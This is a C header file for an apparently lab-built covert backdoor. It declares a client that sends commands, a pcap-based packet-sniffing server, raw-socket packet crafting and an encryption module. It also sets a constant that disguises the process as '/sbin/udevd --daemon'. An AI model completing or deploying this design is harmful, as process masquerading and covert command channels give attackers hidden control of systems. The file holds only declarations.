/*
| ------------------------------------------------------------------------------
| File:     bd.h
| Purpose:  Header file for bd.c
| 
| ------------------------------------------------------------------------------
*/

/*
| ------------------------------------------------------------------------------
| Headers
| ------------------------------------------------------------------------------
*/

#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <pthread.h>
#include <pcap.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include "packet_headers.h"
#include "bd_encrypt.h"

/*
| ------------------------------------------------------------------------------
| Constants
| ------------------------------------------------------------------------------
*/

#define PROCESS_NAME	"/sbin/udevd --daemon"
#define PKT_SIZE        4096
#define WIN_SIZE        55840
#define DEFAULT_TTL		255
#define DEFAULT_IP_ID   12345

#define DEFAULT_SRC_IP      "192.168.1.77"
#define DEFAULT_SRC_PORT    12345
#define DEFAULT_DST_IP      "192.168.1.72"  //"104.131.142.21"
#define DEFAULT_DST_PORT    12345

/*
| ------------------------------------------------------------------------------
| Prototypes
| ------------------------------------------------------------------------------
*/

/* Options to pass to client function */

struct client_opt{
    char target_host[128];
    char command[BD_MAX_MSG_LEN];
    int target_port;
};

/* Options to pass to server function */

struct server_opt{
    char device[128];
};

/* TCP checksum pseudo-header */

typedef struct {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    struct tcphdr tcp;
    char *data;
}pseudo_header;

/* Raw socket object with options */

struct addr_info {
    int raw_socket;
    char *dhost;
    char *shost;
    int dport;
    int sport;
};

void client(struct client_opt c_opt);
int send_datagram(struct addr_info *user_addr, char *data, int data_len);
void server(struct server_opt s_opt);
void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
void mask_process(char **, char *);
void usage();
unsigned short csum(unsigned short *, int);
static void system_fatal(const char* message);
